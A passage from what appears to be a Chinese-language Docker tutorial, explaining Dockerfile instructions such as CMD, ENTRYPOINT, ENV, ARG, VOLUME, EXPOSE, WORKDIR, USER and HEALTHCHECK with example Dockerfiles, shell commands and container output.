<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CMD</span><span class="language-bash"> service nginx start</span></span><br></pre></td></tr></table></figure>

<p>然后发现容器执行后就立即退出了。甚至在容器内去使用 <code>systemctl</code> 命令结果却发现根本执行不了。这就是因为没有搞明白前台、后台的概念，没有区分容器和虚拟机的差异，依旧在以传统虚拟机的角度去理解容器。</p>
<p>对于容器而言，其启动程序就是容器应用进程，容器就是为了主进程而存在的，主进程退出，容器就失去了存在的意义，从而退出，其它辅助进程不是它需要关心的东西。</p>
<p>而使用 <code>service nginx start</code> 命令，则是希望 upstart 来以后台守护进程形式启动 <code>nginx</code> 服务。而刚才说了 <code>CMD service nginx start</code> 会被理解为 <code>CMD [ "sh", "-c", "service nginx start"]</code>，因此主进程实际上是 <code>sh</code>。那么当 <code>service nginx start</code> 命令结束后，<code>sh</code> 也就结束了，<code>sh</code> 作为主进程退出了，自然就会令容器退出。</p>
<p>正确的做法是直接执行 <code>nginx</code> 可执行文件，并且要求以前台形式运行。比如：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">"nginx"</span>, <span class="string">"-g"</span>, <span class="string">"daemon off;"</span>]</span></span><br></pre></td></tr></table></figure>

<h3 id="ENTRYPOINT入口点"><a href="#ENTRYPOINT入口点" class="headerlink" title="ENTRYPOINT入口点"></a><code>ENTRYPOINT</code>入口点</h3><p><code>ENTRYPOINT</code> 的格式和 <code>RUN</code> 指令格式一样，分为 <code>exec</code> 格式和 <code>shell</code> 格式。</p>
<p><code>ENTRYPOINT</code> 的目的和 <code>CMD</code> 一样，都是在指定容器启动程序及参数。<code>ENTRYPOINT</code> 在运行时也可以替代，不过比 <code>CMD</code> 要略显繁琐，需要通过 <code>docker run</code> 的参数 <code>--entrypoint</code> 来指定。</p>
<p>当指定了 <code>ENTRYPOINT</code> 后，<code>CMD</code> 的含义就发生了改变，不再是直接的运行其命令，而是将 <code>CMD</code> 的内容作为参数传给 <code>ENTRYPOINT</code> 指令，换句话说实际执行时，将变为：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">&lt;<span class="keyword">ENTRYPOINT</span><span class="language-bash">&gt; <span class="string">"&lt;CMD&gt;"</span></span></span><br></pre></td></tr></table></figure>

<p><code>ENTRYPOINT</code> 有如下使用场景</p>
<ul>
<li><p>让镜像变成像命令一样使用</p>
<p>  假设需要一个得知自己当前公网 IP 的镜像，可以先用 <code>CMD</code> 来实现：</p>
  <figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">18.04</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get update \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; apt-get install -y curl \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; <span class="built_in">rm</span> -rf /var/lib/apt/lists/*</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [ <span class="string">"curl"</span>, <span class="string">"-s"</span>, <span class="string">"http://myip.ipip.net"</span> ]</span></span><br></pre></td></tr></table></figure>

<p>  假如使用 <code>docker build -t myip .</code> 构建镜像，如果需要查询当前公网 IP，只需要执行：</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run myip</span><br><span class="line">当前 IP：xxx.xxx.xxx.xxx 来自：xxx xx</span><br></pre></td></tr></table></figure>

<p>  这么看起来好像可以直接把镜像当做命令使用了，不过命令总有参数，如果希望加参数呢？比如从上面的 <code>CMD</code> 中可以看到实质的命令是 <code>curl</code>，那么如果希望显示 HTTP 头信息，就需要加上 <code>-i</code> 参数。如果直接加 <code>-i</code> 参数给 <code>docker run myip</code> ：</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run myip -i</span><br><span class="line">docker: Error response from daemon: invalid header field value <span class="string">"oci runtime error: container_linux.go:247: starting container process caused \"exec: \\\"-i\\\": executable file not found in <span class="variable">$PATH</span>\"\n"</span>.</span><br></pre></td></tr></table></figure>

<p>  会出现可执行文件找不到的报错，<code>executable file not found</code>。已知跟在镜像名后面的是 <code>command</code>，运行时会替换 <code>CMD</code> 的默认值。因此这里的 <code>-i</code> 替换了原来的 <code>CMD</code>，而不是添加在原来的 <code>curl -s http://myip.ipip.net</code> 后面。而 <code>-i</code> 根本不是命令，所以自然找不到。</p>
<p>  那么如果希望加入 <code>-i</code> 这参数，就必须重新完整的输入这个命令：</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run myip curl -s http://myip.ipip.net -i</span><br></pre></td></tr></table></figure>

<p>  这显然不是很好的解决方案，而使用 <code>ENTRYPOINT</code> 就可以解决这个问题。现在重新用 <code>ENTRYPOINT</code> 来实现这个镜像：</p>
  <figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">18.04</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get update \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; apt-get install -y curl \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; <span class="built_in">rm</span> -rf /var/lib/apt/lists/*</span></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="language-bash"> [ <span class="string">"curl"</span>, <span class="string">"-s"</span>, <span class="string">"http://myip.ipip.net"</span> ]</span></span><br></pre></td></tr></table></figure>

<p>  再次尝试直接使用 <code>docker run myip -i</code></p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run myip -i</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx/1.8.0</span><br><span class="line">Date: Tue, 22 Nov 2016 05:12:40 GMT</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">X-Powered-By: PHP/5.6.24-1~dotdeb+7.1</span><br><span class="line">X-Cache: MISS from cache-2</span><br><span class="line">X-Cache-Lookup: MISS from cache-2:80</span><br><span class="line">X-Cache: MISS from proxy-2_6</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Via: 1.1 cache-2:80, 1.1 proxy-2_6:8006</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">当前 IP：xxx.xxx.xxx.xxx 来自：xxx xx</span><br></pre></td></tr></table></figure>

<p>  当存在 <code>ENTRYPOINT</code> 后，<code>CMD</code> 的内容将会作为参数传给 <code>ENTRYPOINT</code>，而这里 <code>-i</code> 就是新的 <code>CMD</code>，因此会作为参数传给 <code>curl</code>，从而达到了预期的效果。</p>
</li>
<li><p>应用运行前的准备工作</p>
<p>  启动容器就是启动主进程，但有些时候，启动主进程前，需要一些准备工作。</p>
<p>  比如 <code>mysql</code> 类的数据库，可能需要一些数据库配置、初始化的工作，这些工作要在最终的 mysql 服务器运行之前解决。</p>
<p>  此外，可能希望避免使用 <code>root</code> 用户去启动服务，从而提高安全性，而在启动服务前还需要以 <code>root</code> 身份执行一些必要的准备工作，最后切换到服务用户身份启动服务。或者除了服务外，其它命令依旧可以使用 <code>root</code> 身份执行，方便调试等。</p>
<p>  这些准备工作是和容器 <code>CMD</code> 无关的，无论 <code>CMD</code> 为什么，都需要事先进行一个预处理的工作。这种情况下，可以写一个脚本，然后放入 <code>ENTRYPOINT</code> 中去执行，而这个脚本会将接到的参数（也就是 <code>&lt;CMD&gt;</code>）作为命令，在脚本最后执行。比如官方镜像 <code>redis</code> 中就是这么做的：</p>
  <figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> alpine:<span class="number">3.4</span></span><br><span class="line">...</span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> addgroup -S redis &amp;&amp; adduser -S -G redis redis</span></span><br><span class="line">...</span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="language-bash"> [<span class="string">"docker-entrypoint.sh"</span>]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">6379</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [ <span class="string">"redis-server"</span> ]</span></span><br></pre></td></tr></table></figure>

<p>  可以看到其中为了 redis 服务创建了 redis 用户，并在最后指定了 <code>ENTRYPOINT</code> 为 <code>docker-entrypoint.sh</code> 脚本。</p>
  <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">...</span><br><span class="line"><span class="comment"># allow the container to be started with `--user`</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">"<span class="variable">$1</span>"</span> = <span class="string">'redis-server'</span> -a <span class="string">"<span class="subst">$(id -u)</span>"</span> = <span class="string">'0'</span> ]; <span class="keyword">then</span></span><br><span class="line">    find . \! -user redis -<span class="built_in">exec</span> <span class="built_in">chown</span> redis <span class="string">'{}'</span> +</span><br><span class="line">    <span class="built_in">exec</span> gosu redis <span class="string">"<span class="variable">$0</span>"</span> <span class="string">"<span class="variable">$@</span>"</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exec</span> <span class="string">"<span class="variable">$@</span>"</span></span><br></pre></td></tr></table></figure>

<p>  该脚本的内容就是根据 <code>CMD</code> 的内容来判断，如果是 <code>redis-server</code> 的话，则切换到 <code>redis</code> 用户身份启动服务器，否则依旧使用 <code>root</code> 身份执行。比如：</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -it redis <span class="built_in">id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="ENV设置环境变量"><a href="#ENV设置环境变量" class="headerlink" title="ENV设置环境变量"></a><code>ENV</code>设置环境变量</h3><p>格式有两种：</p>
<ul>
<li>  <code>ENV &lt;key&gt; &lt;value&gt;</code></li>
<li>  <code>ENV &lt;key1&gt;=&lt;value1&gt; &lt;key2&gt;=&lt;value2&gt;...</code></li>
</ul>
<p>这个指令就是设置环境变量，无论是后面的其它指令，如 <code>RUN</code>，还是运行时的应用，都可以直接使用这里定义的环境变量。</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ENV</span> VERSION=<span class="number">1.0</span> DEBUG=on \</span><br><span class="line">    NAME=<span class="string">"Happy Feet"</span></span><br></pre></td></tr></table></figure>

<p>上述例子中演示了如何换行，以及对含有空格的值用双引号括起来的办法，这和 Shell 下的行为是一致的。</p>
<p>定义了环境变量，那么在后续的指令中，就可以使用这个环境变量。比如在官方 <code>node</code> 镜像 <code>Dockerfile</code> 中，就有类似这样的代码：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ENV</span> NODE_VERSION <span class="number">7.2</span>.<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> curl -SLO <span class="string">"https://nodejs.org/dist/v<span class="variable">$NODE_VERSION</span>/node-v<span class="variable">$NODE_VERSION</span>-linux-x64.tar.xz"</span> \</span></span><br><span class="line"><span class="language-bash">  &amp;&amp; curl -SLO <span class="string">"https://nodejs.org/dist/v<span class="variable">$NODE_VERSION</span>/SHASUMS256.txt.asc"</span> \</span></span><br><span class="line"><span class="language-bash">  &amp;&amp; gpg --batch --decrypt --output SHASUMS256.txt SHASUMS256.txt.asc \</span></span><br><span class="line"><span class="language-bash">  &amp;&amp; grep <span class="string">" node-v<span class="variable">$NODE_VERSION</span>-linux-x64.tar.xz\$"</span> SHASUMS256.txt | <span class="built_in">sha256sum</span> -c - \</span></span><br><span class="line"><span class="language-bash">  &amp;&amp; tar -xJf <span class="string">"node-v<span class="variable">$NODE_VERSION</span>-linux-x64.tar.xz"</span> -C /usr/local --strip-components=1 \</span></span><br><span class="line"><span class="language-bash">  &amp;&amp; <span class="built_in">rm</span> <span class="string">"node-v<span class="variable">$NODE_VERSION</span>-linux-x64.tar.xz"</span> SHASUMS256.txt.asc SHASUMS256.txt \</span></span><br><span class="line"><span class="language-bash">  &amp;&amp; <span class="built_in">ln</span> -s /usr/local/bin/node /usr/local/bin/nodejs</span></span><br></pre></td></tr></table></figure>

<p>先定义了环境变量 <code>NODE_VERSION</code>，其后的 <code>RUN</code> 这层里，多次使用 <code>$NODE_VERSION</code> 来进行操作定制。可以看到，将来升级镜像构建版本的时候，只需要更新 <code>7.2.0</code> 即可，<code>Dockerfile</code> 构建维护变得更轻松了。</p>
<p>下列指令可以支持环境变量展开： <code>ADD</code>、<code>COPY</code>、<code>ENV</code>、<code>EXPOSE</code>、<code>FROM</code>、<code>LABEL</code>、<code>USER</code>、<code>WORKDIR</code>、<code>VOLUME</code>、<code>STOPSIGNAL</code>、<code>ONBUILD</code>、<code>RUN</code>。</p>
<p>可以从指令列表里发现，环境变量可以使用的地方很多，很强大。通过环境变量，可以让一份 <code>Dockerfile</code> 制作更多的镜像，只需使用不同的环境变量即可。</p>
<h3 id="ARG构建参数"><a href="#ARG构建参数" class="headerlink" title="ARG构建参数"></a><code>ARG</code>构建参数</h3><p>格式：<code>ARG &lt;参数名&gt;[=&lt;默认值&gt;]</code></p>
<p>构建参数和 <code>ENV</code> 的效果一样，都是设置环境变量。所不同的是，<code>ARG</code> 所设置的构建环境的环境变量，在将来容器运行时是不会存在这些环境变量的。但是不要因此就使用 <code>ARG</code> 保存密码之类的信息，因为 <code>docker history</code> 还是可以看到所有值的。</p>
<p><code>Dockerfile</code> 中的 <code>ARG</code> 指令是定义参数名称，以及定义其默认值。该默认值可以在构建命令 <code>docker build</code> 中用 <code>--build-arg &lt;参数名&gt;=&lt;值&gt;</code> 来覆盖。</p>
<p>灵活的使用 <code>ARG</code> 指令，能够在不修改 Dockerfile 的情况下，构建出不同的镜像。</p>
<p>ARG 指令有生效范围，如果在 <code>FROM</code> 指令之前指定，那么只能用于 <code>FROM</code> 指令中。</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ARG</span> DOCKER_USERNAME=library</span><br><span class="line"></span><br><span class="line"><span class="keyword">FROM</span> ${DOCKER_USERNAME}/alpine</span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">set</span> -x ; <span class="built_in">echo</span> <span class="variable">${DOCKER_USERNAME}</span></span></span><br></pre></td></tr></table></figure>

<p>使用上述 Dockerfile 会发现无法输出 <code>${DOCKER_USERNAME}</code> 变量的值，要想正常输出，必须在 <code>FROM</code> 之后再次指定 <code>ARG</code></p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 只在 FROM 中生效</span></span><br><span class="line"><span class="keyword">ARG</span> DOCKER_USERNAME=library</span><br><span class="line"></span><br><span class="line"><span class="keyword">FROM</span> ${DOCKER_USERNAME}/alpine</span><br><span class="line"></span><br><span class="line"><span class="comment"># 要想在 FROM 之后使用，必须再次指定</span></span><br><span class="line"><span class="keyword">ARG</span> DOCKER_USERNAME=library</span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">set</span> -x ; <span class="built_in">echo</span> <span class="variable">${DOCKER_USERNAME}</span></span></span><br></pre></td></tr></table></figure>

<p>对于多阶段构建，尤其要注意这个问题</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 这个变量在每个 FROM 中都生效</span></span><br><span class="line"><span class="keyword">ARG</span> DOCKER_USERNAME=library</span><br><span class="line"></span><br><span class="line"><span class="keyword">FROM</span> ${DOCKER_USERNAME}/alpine</span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">set</span> -x ; <span class="built_in">echo</span> 1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">FROM</span> ${DOCKER_USERNAME}/alpine</span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">set</span> -x ; <span class="built_in">echo</span> 2</span></span><br></pre></td></tr></table></figure>

<p>对于上述 Dockerfile 两个 <code>FROM</code> 指令都可以使用 <code>${DOCKER_USERNAME}</code>，对于在各个阶段中使用的变量都必须在每个阶段分别指定：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ARG</span> DOCKER_USERNAME=library</span><br><span class="line"></span><br><span class="line"><span class="keyword">FROM</span> ${DOCKER_USERNAME}/alpine</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在FROM 之后使用变量，必须在每个阶段分别指定</span></span><br><span class="line"><span class="keyword">ARG</span> DOCKER_USERNAME=library</span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">set</span> -x ; <span class="built_in">echo</span> <span class="variable">${DOCKER_USERNAME}</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">FROM</span> ${DOCKER_USERNAME}/alpine</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在FROM 之后使用变量，必须在每个阶段分别指定</span></span><br><span class="line"><span class="keyword">ARG</span> DOCKER_USERNAME=library</span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">set</span> -x ; <span class="built_in">echo</span> <span class="variable">${DOCKER_USERNAME}</span></span></span><br></pre></td></tr></table></figure>

<h3 id="VOLUME定义匿名卷"><a href="#VOLUME定义匿名卷" class="headerlink" title="VOLUME定义匿名卷"></a><code>VOLUME</code>定义匿名卷</h3><p>格式：：</p>
<ul>
<li>  <code>VOLUME ["&lt;路径1&gt;", "&lt;路径2&gt;"...]</code></li>
<li>  <code>VOLUME &lt;路径&gt;</code></li>
</ul>
<p>容器运行时应该尽量保持容器存储层不发生写操作，对于数据库类需要保存动态数据的应用，其数据库文件应该保存于卷(volume)中。为了防止运行时用户忘记将动态文件所保存目录挂载为卷，在 <code>Dockerfile</code> 中，可以事先指定某些目录挂载为匿名卷，这样在运行时如果用户不指定挂载，其应用也可以正常运行，不会向容器存储层写入大量数据。</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">VOLUME</span><span class="language-bash"> /data</span></span><br></pre></td></tr></table></figure>

<p>这里的 <code>/data</code> 目录就会在容器运行时自动挂载为匿名卷，任何向 <code>/data</code> 中写入的信息都不会记录进容器存储层，从而保证了容器存储层的无状态化。当然，运行容器时可以覆盖这个挂载设置。比如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d -v mydata:/data xxxx</span><br></pre></td></tr></table></figure>

<p>在这行命令中，就使用了 <code>mydata</code> 这个命名卷挂载到了 <code>/data</code> 这个位置，替代了 <code>Dockerfile</code> 中定义的匿名卷的挂载配置。</p>
<h3 id="EXPOSE暴露端口"><a href="#EXPOSE暴露端口" class="headerlink" title="EXPOSE暴露端口"></a><code>EXPOSE</code>暴露端口</h3><p>格式： <code>EXPOSE &lt;端口1&gt; [&lt;端口2&gt;...]</code></p>
<p><code>EXPOSE</code> 指令是声明容器运行时提供服务的端口，这只是一个声明，在容器运行时并不会因为这个声明应用就会开启这个端口的服务。在 Dockerfile 中写入这样的声明有两个好处，一个是帮助镜像使用者理解这个镜像服务的守护端口，以方便配置映射；另一个用处则是在运行时使用随机端口映射时，也就是 <code>docker run -P</code> 时，会自动随机映射 <code>EXPOSE</code> 的端口。</p>
<p>要将 <code>EXPOSE</code> 和在运行时使用 <code>-p &lt;宿主端口&gt;:&lt;容器端口&gt;</code> 区分开来。<code>-p</code>，是映射宿主端口和容器端口，换句话说，就是将容器的对应端口服务公开给外界访问，而 <code>EXPOSE</code> 仅仅是声明容器打算使用什么端口而已，并不会自动在宿主进行端口映射。</p>
<h3 id="WORKDIR指定工作目录"><a href="#WORKDIR指定工作目录" class="headerlink" title="WORKDIR指定工作目录"></a><code>WORKDIR</code>指定工作目录</h3><p>格式： <code>WORKDIR &lt;工作目录路径&gt;</code></p>
<p>使用 <code>WORKDIR</code> 指令可以来指定工作目录（或者称为当前目录），以后各层的当前目录就被改为指定的目录，如该目录不存在，<code>WORKDIR</code> 会建立目录。</p>
<p>之前提到一些初学者常犯的错误是把 <code>Dockerfile</code> 等同于 Shell 脚本来书写，这种错误的理解还可能会导致出现下面这样的错误：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">cd</span> /app</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> <span class="string">"hello"</span> &gt; world.txt</span></span><br></pre></td></tr></table></figure>

<p>如果将这个 <code>Dockerfile</code> 进行构建镜像运行后，会发现找不到 <code>/app/world.txt</code> 文件，或者其内容不是 <code>hello</code>。原因其实很简单，在 Shell 中，连续两行是同一个进程执行环境，因此前一个命令修改的内存状态，会直接影响后一个命令；而在 <code>Dockerfile</code> 中，这两行 <code>RUN</code> 命令的执行环境根本不同，是两个完全不同的容器。这就是对 <code>Dockerfile</code> 构建分层存储的概念不了解所导致的错误。</p>
<p>每一个 <code>RUN</code> 都是启动一个容器、执行命令、然后提交存储层文件变更。第一层 <code>RUN cd /app</code> 的执行仅仅是当前进程的工作目录变更，一个内存上的变化而已，其结果不会造成任何文件变更。而到第二层的时候，启动的是一个全新的容器，跟第一层的容器更完全没关系，自然不可能继承前一层构建过程中的内存变化。</p>
<p>因此如果需要改变以后各层的工作目录的位置，那么应该使用 <code>WORKDIR</code> 指令。</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /app</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> <span class="string">"hello"</span> &gt; world.txt</span></span><br></pre></td></tr></table></figure>

<p>如果 <code>WORKDIR</code> 指令使用的相对路径，那么所切换的路径与之前的 <code>WORKDIR</code> 有关：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /a</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> b</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> c</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">pwd</span></span></span><br></pre></td></tr></table></figure>

<p><code>RUN pwd</code> 的工作目录为 <code>/a/b/c</code></p>
<h3 id="USER指定当前用户"><a href="#USER指定当前用户" class="headerlink" title="USER指定当前用户"></a><code>USER</code>指定当前用户</h3><p>格式：<code>USER &lt;用户名&gt;[:&lt;用户组&gt;]</code></p>
<p><code>USER</code> 指令和 <code>WORKDIR</code> 相似，都是改变环境状态并影响以后的层。<code>WORKDIR</code> 是改变工作目录，<code>USER</code> 则是改变之后层的执行 <code>RUN</code>, <code>CMD</code> 以及 <code>ENTRYPOINT</code> 这类命令的身份。</p>
<p>注意，<code>USER</code> 只是帮助切换到指定用户而已，这个用户必须是事先建立好的，否则无法切换。</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">RUN</span><span class="language-bash"> groupadd -r redis &amp;&amp; useradd -r -g redis redis</span></span><br><span class="line"><span class="keyword">USER</span> redis</span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> [ <span class="string">"redis-server"</span> ]</span></span><br></pre></td></tr></table></figure>

<p>如果以 <code>root</code> 执行的脚本，在执行期间希望改变身份，比如希望以某个已经建立好的用户来运行某个服务进程，不要使用 <code>su</code> 或者 <code>sudo</code>，这些都需要比较麻烦的配置，而且在 TTY 缺失的环境下经常出错。建议使用 <a href="https://github.com/tianon/gosu"><code>gosu</code></a>。</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 建立 redis 用户，并使用 gosu 换另一个用户执行命令</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> groupadd -r redis &amp;&amp; useradd -r -g redis redis</span></span><br><span class="line"><span class="comment"># 下载 gosu</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> wget -O /usr/local/bin/gosu <span class="string">"https://github.com/tianon/gosu/releases/download/1.12/gosu-amd64"</span> \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; <span class="built_in">chmod</span> +x /usr/local/bin/gosu \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; gosu nobody <span class="literal">true</span></span></span><br><span class="line"><span class="comment"># 设置 CMD，并以另外的用户执行</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [ <span class="string">"exec"</span>, <span class="string">"gosu"</span>, <span class="string">"redis"</span>, <span class="string">"redis-server"</span> ]</span></span><br></pre></td></tr></table></figure>

<h3 id="HEALTHCHECK健康检查"><a href="#HEALTHCHECK健康检查" class="headerlink" title="HEALTHCHECK健康检查"></a><code>HEALTHCHECK</code>健康检查</h3><p>格式：</p>
<ul>
<li>  <code>HEALTHCHECK [选项] CMD &lt;命令&gt;</code>：设置检查容器健康状况的命令</li>
<li>  <code>HEALTHCHECK NONE</code>：如果基础镜像有健康检查指令，使用这行可以屏蔽掉其健康检查指令</li>
</ul>
<p><code>HEALTHCHECK</code> 指令是告诉 Docker 应该如何进行判断容器的状态是否正常。</p>
<p>在没有 <code>HEALTHCHECK</code> 指令前，Docker 引擎只可以通过容器内主进程是否退出来判断容器是否状态异常。很多情况下这没问题，但是如果程序进入死锁状态，或者死循环状态，应用进程并不退出，但是该容器已经无法提供服务了。在 1.12 以前，Docker 不会检测到容器的这种状态，从而不会重新调度，导致可能会有部分容器已经无法提供服务了却还在接受用户请求。</p>
<p>而自 1.12 之后，Docker 提供了 <code>HEALTHCHECK</code> 指令，通过该指令指定一行命令，用这行命令来判断容器主进程的服务状态是否还正常，从而比较真实的反应容器实际状态。</p>
<p>当在一个镜像指定了 <code>HEALTHCHECK</code> 指令后，用其启动容器，初始状态会为 <code>starting</code>，在 <code>HEALTHCHECK</code> 指令检查成功后变为 <code>healthy</code>，如果连续一定次数失败，则会变为 <code>unhealthy</code>。</p>
<p><code>HEALTHCHECK</code> 支持下列选项：</p>
<ul>
<li>  <code>--interval=&lt;间隔&gt;</code>：两次健康检查的间隔，默认为 30 秒；</li>
<li>  <code>--timeout=&lt;时长&gt;</code>：健康检查命令运行超时时间，如果超过这个时间，本次健康检查就被视为失败，默认 30 秒；</li>
<li>  <code>--retries=&lt;次数&gt;</code>：当连续失败指定次数后，则将容器状态视为 <code>unhealthy</code>，默认 3 次。</li>
</ul>
<p>和 <code>CMD</code>, <code>ENTRYPOINT</code> 一样，<code>HEALTHCHECK</code> 只可以出现一次，如果写了多个，只有最后一个生效。</p>
<p>在 <code>HEALTHCHECK [选项] CMD</code> 后面的命令，格式和 <code>ENTRYPOINT</code> 一样，分为 <code>shell</code> 格式，和 <code>exec</code> 格式。命令的返回值决定了该次健康检查的成功与否：<code>0</code>：成功；<code>1</code>：失败；<code>2</code>：保留，不要使用这个值。</p>
<p>假设有个镜像是个最简单的 Web 服务，希望增加健康检查来判断其 Web 服务是否在正常工作，可以用 <code>curl</code> 来帮助判断，其 <code>Dockerfile</code> 的 <code>HEALTHCHECK</code> 可以这么写：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> nginx</span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get update &amp;&amp; apt-get install -y curl &amp;&amp; <span class="built_in">rm</span> -rf /var/lib/apt/lists/*</span></span><br><span class="line"><span class="keyword">HEALTHCHECK</span><span class="language-bash"> --interval=5s --<span class="built_in">timeout</span>=3s \</span></span><br><span class="line"><span class="language-bash">  CMD curl -fs http://localhost/ || <span class="built_in">exit</span> 1</span></span><br></pre></td></tr></table></figure>

<p>设置每 5 秒检查一次（这里为了试验所以间隔非常短，实际应该相对较长），如果健康检查命令超过 3 秒没响应就视为失败，并且使用 <code>curl -fs http://localhost/ || exit 1</code> 作为健康检查命令。</p>
<p>使用 <code>docker build</code> 来构建这个镜像：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">docker build -t myweb:v1 .</span><br></pre></td></tr></table></figure>

<p>构建好了后，启动一个容器：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">docker <span class="keyword">run</span><span class="language-bash"> -d --name web -p 80:80 myweb:v1</span></span><br></pre></td></tr></table></figure>

<p>当运行该镜像后，可以通过 <code>docker container ls</code> 看到最初的状态为 <code>(health: starting)</code>：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">docker container ls</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS                            PORTS               NAMES</span><br><span class="line"><span class="number">03</span>e28eb00bd0        myweb:v1            <span class="string">"nginx -g 'daemon off"</span>   <span class="number">3</span> seconds ago       Up <span class="number">2</span> seconds (health: starting)   <span class="number">80</span>/tcp, <span class="number">443</span>/tcp     web</span><br></pre></td></tr></table></figure>

<p>在等待几秒钟后，再次 <code>docker container ls</code>，就会看到健康状态变化为了 <code>(healthy)</code>：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">docker container ls</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS                    PORTS               NAMES</span><br><span class="line"><span class="number">03</span>e28eb00bd0        myweb:v1            <span class="string">"nginx -g 'daemon off"</span>   <span class="number">18</span> seconds ago      Up <span class="number">16</span> seconds (healthy)   <span class="number">80</span>/tcp, <span class="number">443</span>/tcp     web</span><br></pre></td></tr></table></figure>

<p>如果健康检查连续失败超过了重试次数，状态就会变为 <code>(unhealthy)</code>。</p>
